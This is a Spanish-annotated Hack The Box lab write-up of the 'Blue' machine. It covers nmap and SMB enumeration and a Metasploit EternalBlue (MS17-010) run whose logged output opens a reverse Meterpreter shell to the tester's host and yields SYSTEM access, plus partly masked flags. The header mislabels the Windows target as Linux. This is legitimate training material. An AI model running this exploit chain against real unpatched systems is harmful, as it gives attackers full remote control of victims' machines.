---
title: Blue
date: 2025-12-9 13:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, blue ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/52e077ae40899ab8b024afd51cb29b1c.png
    alt: Hack The Box
---

> Blue
Linux · Easy 

## Task 1

How many open TCP ports are listening on Blue? Don't include any 5-digit ports.

``` shell
┌──(pmartinezr㉿kali)-[~/htb/blue]
└─$ nmap -p- -sCVS -T 5 --min-rate 500 10.129.9.148    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 18:09 CET
Warning: 10.129.9.148 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.9.148
Host is up (0.043s latency).
Not shown: 64811 closed tcp ports (reset), 715 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6s, deviation: 3s, median: 4s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-09T17:11:43
|_  start_date: 2025-12-09T17:02:45
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-09T17:11:47+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.77 seconds
```
La pregunta pide excluir los puertos con 5 digitos así que la respuesta es 3

> 3 

## Task 2

What is the hostname of Blue?

> haris-PC

## Task 3

What operating system is running on the target machine? Give a two-word answer with a name and high-level version.

> Windows 7

## Task 4

How many SMB shares are available on Blue?

``` shell
┌──(pmartinezr㉿kali)-[~/htb/blue]
└─$ smbclient -L 10.129.9.148
Password for [WORKGROUP\pmartinezr]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.9.148 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
El error de conexión no impide enumerar los recursos

> 5

## Task 5

What 2017 Microsoft Security Bulletin number describes a remote code execution vulnerability in SMB?

Buscamos en Internet [https://learn.microsoft.com/es-es/security-updates/securitybulletins/2017/ms17-010](https://learn.microsoft.com/es-es/security-updates/securitybulletins/2017/ms17-010)

> MS17-010

## Task 6 (optional)

Optional question: A worm was set loose on the internet in May 2017 propagating primarily through MS17-010. What is the famous name for that malware?

Como vamos a olvidar el malware que infectó a Telefónica 

> WannaCry

## Task 7

What user do you get execution with when exploiting MS17-010? Include the full name, including anything before a .

``` shell

msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.15.224:4444 
[*] 10.129.9.148:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.9.148:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.23/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.9.148:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.9.148:445 - The target is vulnerable.
[*] 10.129.9.148:445 - Connecting to target for exploitation.
[+] 10.129.9.148:445 - Connection established for exploitation.
[+] 10.129.9.148:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.9.148:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.9.148:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.9.148:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.9.148:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.9.148:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.9.148:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.9.148:445 - Sending all but last fragment of exploit packet
[*] 10.129.9.148:445 - Starting non-paged pool grooming
[+] 10.129.9.148:445 - Sending SMBv2 buffers
[+] 10.129.9.148:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.9.148:445 - Sending final SMBv2 buffers.
[*] 10.129.9.148:445 - Sending last fragment of exploit packet!
[*] 10.129.9.148:445 - Receiving response from exploit packet
[+] 10.129.9.148:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.9.148:445 - Sending egg to corrupted connection.
[*] 10.129.9.148:445 - Triggering free of corrupted buffer.
[*] Sending stage (230982 bytes) to 10.129.9.148
[*] Meterpreter session 1 opened (10.10.15.224:4444 -> 10.129.9.148:49158) at 2025-12-09 18:25:52 +0100
[+] 10.129.9.148:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.9.148:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.9.148:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Hay que fijarse en la pregunta de "incluir cualquier cosa antes de a."
> nt authority\system

## Submit the flag located on the haris user's desktop.

``` shell
c:\Users\haris\Desktop>type user.txt
type user.txt
a377767c9b001fc47************
```

> a377767c9b001fc47************

## Submit the flag located on the administrator's desktop.

``` shell
c:\Users\Administrator\Desktop>type root.txt
type root.txt
a1fa647185976a80e************
```

> a1fa647185976a80e************


[achivement](https://labs.hackthebox.com/achievement/machine/2336390/51)